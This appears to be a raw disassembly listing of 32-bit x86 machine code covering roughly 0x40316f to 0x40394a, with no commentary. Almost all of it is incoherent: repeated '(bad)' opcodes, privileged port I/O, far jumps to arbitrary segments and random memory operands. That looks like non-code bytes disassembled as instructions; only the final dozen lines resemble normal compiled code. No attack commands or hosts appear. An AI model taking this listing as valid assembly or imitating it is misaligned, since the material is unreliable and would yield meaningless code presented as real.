  40316f:	mov    WORD PTR [eax+ecx*4-0x33],gs
  403173:	fdiv   DWORD PTR ds:0x8802b0ae
  403179:	dec    ebx
  40317a:	in     eax,0xee
  40317c:	pusha  
  40317d:	cmp    cl,BYTE PTR [eax]
  40317f:	jae    0x403161
  403181:	sti    
  403182:	add    cl,BYTE PTR [ecx-0x281ab11d]
  403188:	jecxz  0x4031fb
  40318a:	push   esi
  40318b:	mov    BYTE PTR [ecx],cl
  40318d:	mov    es,ebp
  40318f:	adc    al,0xf9
  403191:	inc    ebx
  403192:	jo     0x4031e1
  403194:	out    0xc3,eax
  403196:	repz add cl,ah
  403199:	or     al,0x29
  40319b:	retf   0x46b4
  40319e:	pop    ecx
  40319f:	pop    ebp
  4031a0:	sbb    dh,ch
  4031a2:	mov    BYTE PTR [edi-0x2628f83],ah
  4031a8:	aad    0xeb
  4031aa:	adc    ebp,DWORD PTR [ebp+0xa]
  4031ad:	out    dx,al
  4031ae:	xor    BYTE PTR [edi],0xc0
  4031b1:	mov    cl,0x65
  4031b3:	(bad)  
  4031b4:	and    BYTE PTR [esi+0x24b9e3c6],0xc9
  4031bb:	pop    ebx
  4031bc:	cmp    eax,0xc8623234
  4031c1:	iret   
  4031c2:	scas   eax,DWORD PTR es:[edi]
  4031c3:	cmp    bh,BYTE PTR [eax+0xffb5733]
  4031c9:	inc    edx
  4031ca:	jbe    0x403246
  4031cc:	sti    
  4031cd:	aam    0xb9
  4031cf:	jo     0x403202
  4031d1:	std    
  4031d2:	(bad)  
  4031d3:	jg     0x4031c6
  4031d5:	sub    eax,0xb2b4fdd4
  4031da:	inc    edx
  4031db:	ss jb  0x40318b
  4031de:	repnz push esi
  4031e0:	fld    QWORD PTR [ecx]
  4031e2:	pushf  
  4031e3:	popf   
  4031e4:	pusha  
  4031e5:	cwde   
  4031e6:	fwait
  4031e7:	shr    DWORD PTR [esp+ebp*4-0x66986edc],1
  4031ee:	fisub  WORD PTR [esi-0x51]
  4031f1:	pop    ebx
  4031f2:	xchg   edi,eax
  4031f3:	pop    esp
  4031f4:	xlat   BYTE PTR ds:[ebx]
  4031f5:	jecxz  0x40323a
  4031f7:	(bad)  
  4031f8:	mov    ds:0xb15da311,eax
  4031fd:	xchg   ecx,eax
  4031fe:	sub    eax,0x8396cf3c
  403203:	je     0x403228
  403205:	push   ds
  403206:	sbb    edi,DWORD PTR [ebx+0x53]
  403209:	push   edx
  40320a:	pop    esi
  40320b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40320c:	mov    dh,0x44
  40320e:	std    
  40320f:	cdq    
  403210:	lahf   
  403211:	jmp    0x193c:0xef6dcaf8
  403218:	rcr    DWORD PTR [eax+0x15],cl
  40321b:	inc    esi
  40321c:	test   ah,0x20
  40321f:	out    0x37,al
  403221:	scas   al,BYTE PTR es:[edi]
  403222:	icebp  
  403223:	pop    ebp
  403224:	mov    bl,0x33
  403226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403227:	mov    dh,BYTE PTR [edx-0x2a9ee456]
  40322d:	retf   0xf13e
  403230:	xor    al,0x6d
  403232:	in     al,0x47
  403234:	xchg   DWORD PTR [ecx],esi
  403236:	push   esi
  403237:	xor    al,0xa9
  403239:	enter  0xd56e,0xce
  40323d:	xchg   esp,eax
  40323e:	ficomp DWORD PTR ds:0x37b6abc5
  403244:	dec    esp
  403245:	(bad)  
  403246:	pop    esp
  403247:	sbb    DWORD PTR [esi],0xebe1efd4
  40324d:	xor    eax,edx
  40324f:	shr    ecx,0xbe
  403252:	mov    bl,0x69
  403254:	and    al,0xf9
  403256:	fucomip st,st(1)
  403258:	ja     0x4031ed
  40325a:	in     eax,dx
  40325b:	je     0x40327a
  40325d:	(bad)  
  40325e:	jno    0x4032a0
  403260:	adc    dl,cl
  403262:	xchg   esp,eax
  403263:	add    eax,0x891545f5
  403268:	xor    al,0x58
  40326a:	test   eax,0xe535efe5
  40326f:	xchg   ebx,eax
  403270:	or     eax,0x7140f8
  403275:	sbb    eax,0x6f41a4ef
  40327a:	stos   BYTE PTR es:[edi],al
  40327b:	mov    cl,0x71
  40327d:	stos   DWORD PTR es:[edi],eax
  40327e:	(bad)  
  40327f:	popf   
  403280:	(bad)  
  403281:	das    
  403282:	dec    ebx
  403283:	and    DWORD PTR [ebx],ebp
  403285:	add    al,0xf9
  403287:	stos   BYTE PTR es:[edi],al
  403288:	pop    edi
  403289:	int3   
  40328a:	ss xor eax,0x9dd8b301
  403290:	xchg   ecx,eax
  403291:	setbe  BYTE PTR [ebx-0x7442d11f]
  403298:	fist   WORD PTR [ebp+0x54f9d5b1]
  40329e:	sub    al,0x1e
  4032a0:	shr    DWORD PTR [eax+0x5b],cl
  4032a3:	mov    ecx,0xb4f26f29
  4032a8:	test   al,0xe9
  4032aa:	aaa    
  4032ab:	gs icebp 
  4032ad:	pop    ebx
  4032ae:	popf   
  4032af:	rcr    DWORD PTR [edi],1
  4032b1:	dec    edx
  4032b2:	hlt    
  4032b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b4:	arpl   WORD PTR [edi+0x20],bp
  4032b7:	pop    edx
  4032b8:	scas   eax,DWORD PTR es:[edi]
  4032b9:	setb   al
  4032bc:	add    ah,dh
  4032be:	std    
  4032bf:	pop    ebp
  4032c0:	sbb    BYTE PTR [edi+0x194456d2],bh
  4032c6:	pop    edx
  4032c7:	xor    bh,dl
  4032c9:	call   0xe3a:0x15cf470d
  4032d0:	out    dx,al
  4032d1:	push   0x72b4d4f7
  4032d6:	pop    ebp
  4032d7:	mov    ah,0x4
  4032d9:	retf   0x3d9b
  4032dc:	push   ecx
  4032dd:	into   
  4032de:	test   al,0x72
  4032e0:	jl     0x403308
  4032e2:	rcl    DWORD PTR [eax-0x769bcef],cl
  4032e8:	push   0x3e
  4032ea:	dec    esi
  4032eb:	(bad)  
  4032ec:	mov    eax,0xd08e8525
  4032f1:	and    edx,DWORD PTR [edx]
  4032f3:	ss adc eax,0xa44764b4
  4032f9:	and    ah,BYTE PTR [ecx]
  4032fb:	sahf   
  4032fc:	inc    ebp
  4032fd:	cli    
  4032fe:	pusha  
  4032ff:	xchg   edx,eax
  403300:	ret    
  403301:	pop    edx
  403302:	mov    esp,0x5438a0c5
  403307:	pusha  
  403308:	push   esp
  403309:	cwde   
  40330a:	scas   al,BYTE PTR es:[edi]
  40330b:	cmp    BYTE PTR [edx-0x2d69ca6e],0xfb
  403312:	call   0x9143:0xece3dbb
  403319:	loopne 0x4032d8
  40331b:	pop    esi
  40331c:	jmp    0x83afb47a
  403321:	pusha  
  403322:	and    al,0x6b
  403324:	sar    DWORD PTR [ebx+0x26c204bc],0xcf
  40332b:	and    edi,DWORD PTR [ecx-0x7d]
  40332e:	pushf  
  40332f:	cmp    BYTE PTR [ebx-0x216c738f],ch
  403335:	jp     0x40333a
  403337:	jp     0x40336b
  403339:	(bad)  [eax-0x78234a34]
  40333f:	sbb    bl,bl
  403341:	xor    dl,BYTE PTR [eax-0x7e]
  403344:	mov    ebx,0x50d47402
  403349:	ins    BYTE PTR es:[edi],dx
  40334a:	test   eax,0x9173f306
  40334f:	aad    0x89
  403351:	in     eax,0xdc
  403353:	mov    edx,DWORD PTR [eax]
  403355:	push   ecx
  403356:	pop    esi
  403357:	jno    0x403336
  403359:	sbb    al,0x29
  40335b:	sub    ah,dh
  40335d:	inc    edi
  40335e:	pop    es
  40335f:	pop    ss
  403360:	daa    
  403361:	cmp    DWORD PTR [eax+ebp*8-0x23],esp
  403365:	add    al,0xe6
  403367:	ds push ecx
  403369:	sub    eax,0xbfb550dd
  40336e:	sti    
  40336f:	push   ds
  403370:	retf   
  403371:	mov    al,0xe
  403373:	lds    ebx,FWORD PTR [edx-0x25554f29]
  403379:	add    ecx,ebx
  40337b:	mov    bh,0xf4
  40337d:	add    BYTE PTR [edx-0x3f],bh
  403380:	icebp  
  403381:	mov    ebp,0x884be8e0
  403386:	mov    al,0xdb
  403388:	pop    edi
  403389:	sub    al,0xaa
  40338b:	aad    0x10
  40338d:	cmp    BYTE PTR [edi+0x419ad17f],0xe6
  403394:	dec    eax
  403395:	push   ebx
  403396:	pushf  
  403397:	dec    edi
  403398:	hlt    
  403399:	rcr    bl,0x66
  40339c:	jno    0x403358
  40339e:	(bad)  
  4033a0:	jnp    0x40332f
  4033a2:	jno    0x40333b
  4033a4:	inc    eax
  4033a5:	fdiv   DWORD PTR [edi+esi*2+0x66]
  4033a9:	adc    dh,ch
  4033ab:	sbb    BYTE PTR ds:0x30b91e7a,0xf3
  4033b2:	sbb    al,0x7
  4033b4:	mov    dh,0x4a
  4033b6:	jl     0x4033b6
  4033b8:	inc    eax
  4033b9:	pop    ss
  4033ba:	mov    al,ds:0xb9dfa803
  4033bf:	ins    DWORD PTR es:[edi],dx
  4033c0:	repnz aaa 
  4033c2:	and    ebp,esi
  4033c4:	or     al,0xf7
  4033c6:	iret   
  4033c7:	les    eax,FWORD PTR [esi]
  4033c9:	jo     0x403383
  4033cb:	cli    
  4033cc:	pushf  
  4033cd:	popa   
  4033ce:	jp     0x403409
  4033d0:	push   ebp
  4033d1:	ss push esp
  4033d3:	adc    ebx,DWORD PTR [ecx-0x69]
  4033d6:	fldcw  WORD PTR ds:0x16ccb11
  4033dc:	jl     0x4033a5
  4033de:	(bad)  
  4033df:	cld    
  4033e0:	mov    eax,ds:0xd7bd353f
  4033e5:	xchg   ebp,eax
  4033e6:	push   edi
  4033e7:	mov    ah,0x9
  4033e9:	cmp    DWORD PTR [ebp-0x1b],0xf74de51f
  4033f0:	out    dx,al
  4033f1:	in     al,0x88
  4033f3:	sqrtps xmm7,XMMWORD PTR [edx-0x35d185e2]
  4033fa:	xor    DWORD PTR [edx],esi
  4033fc:	callw  0x75c7
  403400:	lods   eax,DWORD PTR ds:[esi]
  403401:	aaa    
  403402:	das    
  403403:	enter  0xf40c,0xdc
  403407:	std    
  403408:	and    dl,BYTE PTR [edx-0x1dd974a2]
  40340e:	mov    eax,ds:0xb3fdde50
  403413:	mov    cl,0x21
  403415:	(bad)  [ecx+0x1b52d29c]
  40341b:	cwde   
  40341c:	mov    bl,0x1
  40341e:	in     eax,dx
  40341f:	mov    esp,0x46f73e48
  403424:	mov    esi,0x124b6eb6
  403429:	mov    dl,BYTE PTR [eax]
  40342b:	fs int 0x52
  40342e:	jecxz  0x4033f5
  403430:	mov    dh,0xe2
  403432:	leave  
  403433:	push   ecx
  403434:	xor    DWORD PTR [esi+0x70],ecx
  403437:	int3   
  403438:	js     0x403401
  40343a:	shl    DWORD PTR [eax+0x242851e1],cl
  403440:	sub    eax,DWORD PTR [esi]
  403442:	cmp    bh,BYTE PTR [eax]
  403444:	inc    eax
  403445:	faddp  st(3),st
  403447:	in     al,dx
  403448:	aaa    
  403449:	pop    ecx
  40344a:	push   eax
  40344b:	mov    dl,0x6e
  40344d:	sub    ebp,DWORD PTR [esi+0x59]
  403450:	mov    al,ds:0x457f67ad
  403455:	std    
  403456:	or     DWORD PTR ds:0xbe3dfab7,esi
  40345c:	std    
  40345d:	push   eax
  40345e:	call   0x2db60acf
  403463:	add    al,BYTE PTR [ecx+0x1b640039]
  403469:	out    0x45,al
  40346b:	push   ds
  40346c:	mov    bl,0x7
  40346e:	mov    WORD PTR [ebp+ebx*2+0x144d0315],gs
  403475:	mov    esi,0x3147e2e8
  40347a:	add    edx,eax
  40347c:	(bad)  
  40347d:	xchg   esp,eax
  40347e:	icebp  
  40347f:	push   0x6f43ccfa
  403484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403485:	dec    ebp
  403486:	jle    0x403427
  403488:	jmp    0x984ca07d
  40348d:	push   ebp
  40348e:	mov    ebx,0x9dde4346
  403493:	in     eax,0x89
  403495:	in     al,0xc0
  403497:	mov    ecx,0xc13ec944
  40349c:	pop    ds
  40349d:	pop    esp
  40349e:	cmp    BYTE PTR [eax-0x5f],ch
  4034a1:	fstp   DWORD PTR [eax-0x3d1b2fdc]
  4034a7:	push   esi
  4034a8:	dec    esp
  4034a9:	clc    
  4034aa:	sub    al,0x12
  4034ac:	cwde   
  4034ad:	outs   dx,BYTE PTR ds:[esi]
  4034ae:	ss jo  0x40346c
  4034b1:	bound  edx,QWORD PTR [ebp*1+0x25ac4852]
  4034b8:	aaa    
  4034b9:	and    BYTE PTR [edx+0x4c],al
  4034bc:	xchg   BYTE PTR [ebp-0x22],bl
  4034bf:	xlat   BYTE PTR ds:[ebx]
  4034c0:	sbb    BYTE PTR [edx+eiz*8-0xf23794e],bl
  4034c7:	inc    ecx
  4034c8:	mov    bl,0xf6
  4034ca:	arpl   di,sp
  4034cc:	ror    BYTE PTR [ebx+0x1a69e00e],cl
  4034d2:	test   bl,dl
  4034d4:	test   ch,0x10
  4034d7:	pop    eax
  4034d8:	arpl   WORD PTR [eax+esi*4+0x7c517100],dx
  4034df:	and    BYTE PTR [ecx+ebx*4],cl
  4034e2:	cmp    esi,DWORD PTR [edx]
  4034e4:	lock scas eax,DWORD PTR es:[edi]
  4034e6:	mov    bh,BYTE PTR [ebx+0x2b74e001]
  4034ec:	mov    esi,0x33cd1ba
  4034f1:	jl     0x40349d
  4034f3:	shl    DWORD PTR [ebx],cl
  4034f5:	mov    eax,ds:0x7561a6d9
  4034fa:	jo     0x40353b
  4034fc:	push   es
  4034fd:	add    eax,0x43fdef43
  403502:	std    
  403503:	(bad)  
  403504:	jb     0x4034c0
  403506:	ins    DWORD PTR es:[edi],dx
  403507:	cmp    BYTE PTR [eax+0x2f],bh
  40350a:	and    eax,0x69da2208
  40350f:	fs das 
  403511:	xchg   ecx,eax
  403512:	xchg   edx,eax
  403513:	not    BYTE PTR [eax]
  403515:	xchg   DWORD PTR [edx+0x74],esi
  403518:	or     eax,0xe1bd2a61
  40351d:	and    esi,DWORD PTR [eax+ebx*4+0x5243854f]
  403524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403525:	jecxz  0x403552
  403527:	daa    
  403528:	or     BYTE PTR [esi+0x7b],ch
  40352b:	add    al,0x8e
  40352d:	leave  
  40352e:	cdq    
  40352f:	dec    esi
  403530:	es mov eax,0x113cae80
  403536:	jp     0x403553
  403538:	pop    edi
  403539:	pop    edx
  40353a:	dec    esp
  40353b:	push   edi
  40353c:	rol    BYTE PTR [edi],1
  40353e:	push   esp
  40353f:	jno    0x4035af
  403541:	add    DWORD PTR [esi+0x5bed8e23],0xffffffd1
  403548:	push   ebp
  403549:	pushf  
  40354a:	push   0x3c
  40354c:	dec    ebp
  40354d:	push   eax
  40354e:	and    esi,DWORD PTR [eax]
  403550:	je     0x403517
  403552:	mov    dl,0x7
  403554:	sub    al,0x38
  403556:	pop    edi
  403557:	adc    BYTE PTR [esi],dl
  403559:	push   edx
  40355a:	sbb    ebp,ebp
  40355c:	sub    DWORD PTR [ebx-0x6c],esi
  40355f:	dec    ebx
  403560:	jp     0x40352a
  403562:	cmp    edx,DWORD PTR [ebx-0x60]
  403565:	loope  0x403596
  403567:	ins    BYTE PTR es:[edi],dx
  403568:	test   al,0xe9
  40356a:	(bad)  
  40356b:	retf   
  40356c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40356d:	sbb    ecx,DWORD PTR [eax+0x781594bc]
  403573:	pushf  
  403574:	and    cl,BYTE PTR [edx+ebp*4]
  403577:	jmp    0x4035ec
  403579:	mov    cl,0x77
  40357b:	sub    bl,0x99
  40357e:	inc    ebx
  40357f:	or     BYTE PTR [edx-0x40d5f99f],0x6e
  403586:	add    al,0xaa
  403588:	icebp  
  403589:	pop    ss
  40358a:	push   ss
  40358b:	arpl   WORD PTR [ecx],dx
  40358d:	fs jno 0x403547
  403590:	dec    BYTE PTR [edi-0x27d44224]
  403596:	mov    ds:0xf3a0cd8e,al
  40359b:	dec    ebx
  40359c:	fild   WORD PTR [edi+ecx*8+0x6c398947]
  4035a3:	pop    ecx
  4035a4:	and    eax,0x23980b99
  4035a9:	inc    BYTE PTR [esi]
  4035ab:	pop    es
  4035ac:	cli    
  4035ad:	fcom   DWORD PTR [eax+ecx*2]
  4035b0:	fbstp  TBYTE PTR [edx+eiz*8]
  4035b3:	sub    al,0x46
  4035b5:	xchg   DWORD PTR [ecx-0x13],ecx
  4035b8:	jmp    0x403581
  4035ba:	pop    eax
  4035bb:	jg     0x403587
  4035bd:	stos   BYTE PTR es:[edi],al
  4035be:	lock cld 
  4035c0:	data16 mov bl,0xf2
  4035c3:	inc    ebp
  4035c4:	fbld   TBYTE PTR [ebp+0x20]
  4035c7:	je     0x4035d3
  4035c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ca:	in     eax,dx
  4035cb:	xor    DWORD PTR [ebx+eax*1+0x58],esi
  4035cf:	push   edi
  4035d0:	mov    dh,ch
  4035d2:	jmp    0x403635
  4035d4:	or     dl,BYTE PTR [ebx+ebx*4]
  4035d7:	xor    dh,dl
  4035d9:	mov    al,ds:0xf5b67037
  4035de:	in     al,0xc6
  4035e0:	inc    edi
  4035e1:	jnp    0x403638
  4035e3:	dec    ebx
  4035e4:	in     al,dx
  4035e5:	lods   eax,DWORD PTR ds:[esi]
  4035e6:	lods   al,BYTE PTR ds:[esi]
  4035e7:	neg    ch
  4035e9:	xchg   esp,eax
  4035ea:	xlat   BYTE PTR ds:[ebx]
  4035eb:	mov    WORD PTR [eax],?
  4035ed:	cmp    BYTE PTR [edx+ebx*4],bh
  4035f0:	xchg   BYTE PTR ds:0xacd73b26,al
  4035f6:	pop    edi
  4035f7:	xchg   ecx,esi
  4035f9:	cmp    dh,BYTE PTR ds:0x1f11c062
  4035ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403600:	mov    al,ds:0xe9d649a
  403605:	imul   esp,DWORD PTR [edi],0xce45453e
  40360b:	shr    BYTE PTR [ebx+0x3aaaba6a],cl
  403611:	cmp    BYTE PTR [ebx-0x58],ah
  403614:	retf   
  403615:	inc    esp
  403616:	xchg   ecx,eax
  403617:	xchg   edi,eax
  403618:	dec    esp
  403619:	les    edi,FWORD PTR [edx+0x216df42]
  40361f:	mov    edi,0x7855da52
  403624:	and    ecx,DWORD PTR [edi-0x280f8d34]
  40362a:	gs sbb eax,0x9665de5
  403630:	sub    al,0x50
  403632:	(bad)  
  403633:	xlat   BYTE PTR ds:[ebx]
  403634:	or     al,BYTE PTR [edx+0x1d]
  403637:	div    DWORD PTR [eax+edi*8+0x48]
  40363b:	sub    ah,BYTE PTR [eax+0x4b282cb9]
  403641:	lds    edi,FWORD PTR [ecx]
  403643:	cmp    DWORD PTR [esi],eax
  403645:	push   0x14
  403647:	aaa    
  403648:	idiv   BYTE PTR [edi-0x26]
  40364b:	cwde   
  40364c:	pop    ebx
  40364d:	retf   0x3296
  403650:	inc    edi
  403651:	sbb    DWORD PTR [edi+0x210590ab],ebx
  403657:	das    
  403658:	xchg   ebx,eax
  403659:	test   ebp,esp
  40365b:	sbb    eax,0x5c4f4425
  403660:	xchg   edx,eax
  403661:	cmp    ebx,DWORD PTR [ebx+0x2c]
  403664:	pop    esp
  403665:	call   0x7dfdfa78
  40366a:	sbb    bh,BYTE PTR [edx-0x40]
  40366d:	shl    BYTE PTR [esi-0x9],cl
  403670:	iret   
  403671:	dec    esp
  403672:	adc    al,0x6f
  403674:	jb     0x40364a
  403676:	mov    dh,0xe2
  403678:	adc    ch,BYTE PTR [esi+0x11]
  40367b:	scas   eax,DWORD PTR es:[edi]
  40367c:	mov    eax,ds:0x1a0e8489
  403681:	enter  0xa392,0x6f
  403685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403686:	jb     0x40363f
  403688:	cdq    
  403689:	push   edx
  40368a:	xchg   ebx,eax
  40368b:	fsub   DWORD PTR [ebx-0x3c]
  40368e:	adc    eax,0x6d48787c
  403693:	mov    cl,0x7c
  403695:	adc    al,0xfb
  403697:	sbb    dh,BYTE PTR [esi+0x64]
  40369a:	fsubp  st(2),st
  40369c:	or     edx,DWORD PTR [ebp+eax*4+0x45]
  4036a0:	dec    edi
  4036a1:	fmul   DWORD PTR [ebx]
  4036a3:	(bad)  
  4036a4:	shl    BYTE PTR ss:[edi],0x3d
  4036a8:	sbb    eax,0xb50788f8
  4036ad:	xchg   esp,eax
  4036ae:	sar    BYTE PTR [ebp+0x4ab612f8],cl
  4036b4:	xchg   edi,eax
  4036b5:	sbb    eax,0x5ec25df4
  4036ba:	pop    es
  4036bb:	add    ch,BYTE PTR [ebx-0x80]
  4036be:	shr    BYTE PTR [eax],cl
  4036c0:	xchg   edx,eax
  4036c1:	dec    eax
  4036c2:	mov    esi,0xdeeb142b
  4036c7:	jl     0x4036a2
  4036c9:	xor    bl,BYTE PTR [eax+0x44]
  4036cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036cd:	add    BYTE PTR [esi-0x50831c4a],0xd0
  4036d4:	or     al,0x4a
  4036d6:	shr    BYTE PTR [eax-0x32],0x90
  4036da:	out    dx,eax
  4036db:	gs das 
  4036dd:	fsubr  QWORD PTR [ecx+0x60]
  4036e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e1:	mov    es,WORD PTR [edx+0x31dbf368]
  4036e7:	aaa    
  4036e8:	sti    
  4036e9:	dec    eax
  4036ea:	popf   
  4036eb:	or     BYTE PTR [edx-0x5fa98d39],ch
  4036f1:	into   
  4036f2:	pop    esi
  4036f3:	ins    DWORD PTR es:[edi],dx
  4036f4:	out    dx,eax
  4036f5:	aaa    
  4036f6:	sub    ah,BYTE PTR [edx-0x11d1d8f6]
  4036fc:	adc    eax,0xdd806cbc
  403701:	push   0xb0f0ef39
  403706:	fdiv   QWORD PTR [eax+0x48]
  403709:	into   
  40370a:	add    ah,BYTE PTR [ecx-0x4086d7ce]
  403710:	mov    ah,0xdb
  403712:	xchg   edi,eax
  403713:	dec    edi
  403714:	mov    esp,0x3055e2a9
  403719:	inc    esi
  40371a:	cdq    
  40371b:	mov    edi,0x6ea21448
  403720:	cs and eax,esp
  403723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403724:	call   0xa8131156
  403729:	in     eax,dx
  40372a:	ja     0x40370b
  40372c:	xor    eax,0x609b060d
  403731:	xchg   ecx,eax
  403732:	pop    edi
  403733:	sub    eax,0x46d59a69
  403738:	loop   0x40370e
  40373a:	aam    0x23
  40373c:	xor    ecx,ecx
  40373e:	and    BYTE PTR [esi+edx*8-0x37f95e3e],al
  403745:	jae    0x40372c
  403747:	popa   
  403748:	mov    cl,0x50
  40374a:	mov    ds:0x3edaf315,al
  40374f:	pop    ds
  403750:	xchg   DWORD PTR [ecx+0x4f269452],esp
  403756:	push   edx
  403757:	mov    bl,0xb8
  403759:	lea    edx,[edx+0x5a]
  40375c:	push   cs
  40375d:	pop    es
  40375e:	out    0xc7,eax
  403760:	push   cs
  403761:	or     edx,DWORD PTR [esi+eax*1-0x20]
  403765:	mov    ebp,0xad75e35
  40376a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40376b:	hlt    
  40376c:	(bad)  
  40376d:	dec    edx
  40376e:	leave  
  40376f:	inc    eax
  403770:	inc    BYTE PTR [ebp-0x21b98d01]
  403776:	mov    ax,0x1c98
  40377a:	push   0x1c
  40377c:	push   edx
  40377d:	mov    ds:0xc13048a1,eax
  403782:	pop    esi
  403783:	mov    esp,0x98596a00
  403788:	mov    eax,ds:0x60d6dd05
  40378d:	js     0x4037c9
  40378f:	cmp    DWORD PTR [ecx],eax
  403791:	cwde   
  403792:	pop    ebp
  403793:	push   cs
  403794:	ja     0x4037b2
  403796:	add    al,0x3f
  403798:	adc    eax,0x68039cd3
  40379d:	into   
  40379e:	(bad)  
  40379f:	stos   BYTE PTR es:[edi],al
  4037a0:	imul   edi,DWORD PTR [ebp+0x2f],0x9279e927
  4037a7:	mov    ecx,0x49631ec3
  4037ac:	fsubr  QWORD PTR [edx+0x33]
  4037af:	fdivr  QWORD PTR [ebp+edi*8+0x47]
  4037b3:	jle    0x403737
  4037b5:	shr    BYTE PTR [esi],cl
  4037b7:	jno    0x403816
  4037b9:	mov    BYTE PTR [ebx],bl
  4037bb:	inc    eax
  4037bc:	mov    dh,0x65
  4037be:	xchg   esi,eax
  4037bf:	out    dx,eax
  4037c0:	xchg   edi,eax
  4037c1:	mov    eax,ds:0xf35eb73c
  4037c6:	(bad)  
  4037c7:	xchg   ebx,eax
  4037c8:	sub    eax,0x12c39675
  4037cd:	fs inc ebp
  4037cf:	cmc    
  4037d0:	pop    eax
  4037d1:	stos   BYTE PTR es:[edi],al
  4037d2:	xchg   ecx,eax
  4037d3:	push   0xffffffa0
  4037d5:	scas   al,BYTE PTR es:[edi]
  4037d6:	mov    esp,0xe00a5fb3
  4037db:	push   ecx
  4037dc:	arpl   WORD PTR [ebx],di
  4037de:	and    bl,0xc8
  4037e1:	xchg   ebx,eax
  4037e2:	cmc    
  4037e3:	out    0x42,al
  4037e5:	mov    BYTE PTR [esi+0x28],0x52
  4037e9:	dec    ecx
  4037ea:	shl    BYTE PTR [ecx+eiz*2-0xc],1
  4037ee:	(bad)
  4037f2:	je     0x4037fc
  4037f4:	mov    bl,0x48
  4037f6:	in     al,0xb3
  4037f8:	test   al,0xf4
  4037fa:	pop    edx
  4037fb:	shr    esi,0x98
  4037fe:	aaa    
  4037ff:	(bad)  
  403800:	push   eax
  403801:	push   ecx
  403802:	xor    bp,WORD PTR [ebp+eax*4-0x7]
  403807:	aaa    
  403808:	les    ebp,FWORD PTR [esi-0x755d7cbf]
  40380e:	pop    esp
  40380f:	not    BYTE PTR [ebx-0x3db4f9c3]
  403815:	sub    edx,edx
  403817:	xor    BYTE PTR [ecx+0x73],bl
  40381a:	push   ecx
  40381b:	sbb    cl,BYTE PTR ds:0x1b5ad196
  403821:	fadd   QWORD PTR [ebp-0x4993a09]
  403827:	test   eax,0xebaa40a
  40382c:	dec    ebx
  40382d:	jns    0x403846
  40382f:	lods   eax,DWORD PTR ds:[esi]
  403830:	or     BYTE PTR [eax+eax*4+0x660760d0],dl
  403837:	daa    
  403838:	cmp    DWORD PTR [ecx],ebp
  40383a:	mov    ecx,0x8e32d381
  40383f:	inc    ecx
  403840:	mov    al,ds:0x94f9ae07
  403845:	pop    eax
  403846:	(bad)  
  403847:	jnp    0x403842
  403849:	push   ecx
  40384a:	int    0x41
  40384c:	add    esi,DWORD PTR [esi]
  40384e:	das    
  40384f:	inc    edi
  403850:	out    0x5c,al
  403852:	aad    0xf2
  403854:	mov    ah,ah
  403856:	data16 and al,0x20
  403859:	bound  ecx,QWORD PTR [edx]
  40385b:	sub    edx,DWORD PTR [ecx-0x66b4c37d]
  403861:	mov    esi,0xec34bc04
  403866:	sub    al,0x6c
  403868:	test   al,0xa9
  40386a:	(bad)  
  40386b:	loopne 0x40386a
  40386d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40386e:	fwait
  40386f:	das    
  403870:	fcom   DWORD PTR [ebx]
  403872:	sbb    BYTE PTR [eax-0xb0848ff],ah
  403878:	sbb    ebx,esi
  40387a:	sahf   
  40387b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40387c:	std    
  40387d:	xchg   esp,eax
  40387e:	mov    esi,0x63c180c2
  403883:	sbb    eax,0xa26dc7e
  403888:	gs out dx,eax
  40388a:	inc    eax
  40388b:	jns    0x4038b3
  40388d:	xchg   esp,eax
  40388e:	das    
  40388f:	cli    
  403890:	ds sbb al,0x6a
  403893:	inc    esi
  403894:	in     al,dx
  403895:	jmp    0x44e2:0xe0da303d
  40389c:	mov    ebx,0x1c7f8465
  4038a1:	mov    cl,0x2c
  4038a3:	mov    ds:0xa4dcd1a6,eax
  4038a8:	lahf   
  4038a9:	dec    edx
  4038aa:	pop    eax
  4038ab:	enter  0x6437,0x6f
  4038af:	pop    ecx
  4038b0:	xchg   ebp,eax
  4038b1:	push   ebp
  4038b2:	sub    BYTE PTR [ecx+0x1864b243],0x42
  4038b9:	out    0x86,eax
  4038bb:	push   esi
  4038bc:	mov    ah,0xa1
  4038be:	dec    ebp
  4038bf:	daa    
  4038c0:	xchg   DWORD PTR [esi-0x5d3dd035],edi
  4038c6:	dec    eax
  4038c7:	outs   dx,BYTE PTR ds:[esi]
  4038c8:	mov    al,0xa3
  4038ca:	rcr    ch,0xb3
  4038cd:	mov    eax,0x8e3a9498
  4038d2:	jb     0x40390c
  4038d4:	ja     0x40389b
  4038d6:	push   esi
  4038d7:	cmp    BYTE PTR [eax-0x67dac3df],ah
  4038dd:	push   ss
  4038de:	mov    edx,0x7da64136
  4038e3:	outs   dx,DWORD PTR ds:[esi]
  4038e4:	int3   
  4038e5:	test   eax,0xb68c9e79
  4038ea:	and    al,0xa5
  4038ec:	mov    DWORD PTR [ebp+0x1714f04],edx
  4038f2:	das    
  4038f3:	leave  
  4038f4:	test   eax,0xbfa7d2fa
  4038f9:	jmp    0x403918
  4038fb:	(bad)  
  4038fc:	out    dx,eax
  4038fd:	sbb    eax,0x11ed36c6
  403902:	push   edi
  403903:	mov    ecx,DWORD PTR [ebp-0x10]
  403906:	sub    DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
